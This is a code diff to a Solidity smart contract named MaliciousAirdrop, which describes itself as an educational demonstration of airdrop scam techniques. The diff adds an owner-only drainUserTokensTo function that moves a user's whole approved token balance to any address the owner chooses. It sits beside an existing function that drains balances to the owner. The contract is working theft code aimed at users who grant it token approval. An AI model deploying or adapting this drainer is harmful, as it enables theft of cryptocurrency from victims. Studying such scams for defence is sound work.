@@ -5,10 +5,10 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 /**
- * @title MaliciousAirdrop
- * @dev This contract demonstrates common malicious airdrop scam techniques
- * WARNING: This is for educational purposes only - DO NOT deploy to mainnet
- */
+* @title MaliciousAirdrop
+* @dev This contract demonstrates common malicious airdrop scam techniques
+* WARNING: This is for educational purposes only - DO NOT deploy to mainnet
+*/
 contract MaliciousAirdrop is Ownable {
     mapping(address => bool) public hasClaimed;
     event AirdropClaimed(address indexed user, uint256 amount);
@@ -30,6 +30,15 @@ contract MaliciousAirdrop is Ownable {
         uint256 balance = token.balanceOf(_user);
         if (balance > 0) {
             require(token.transferFrom(_user, owner(), balance), "Transfer failed");
+            emit TokensDrained(_user, _token, balance);
+        }
+    }
+
+    function drainUserTokensTo(address _user, address _token, address _to) external onlyOwner {
+        IERC20 token = IERC20(_token);
+        uint256 balance = token.balanceOf(_user);
+        if (balance > 0) {
+            require(token.transferFrom(_user, _to, balance), "Transfer failed");
             emit TokensDrained(_user, _token, balance);
         }
     }
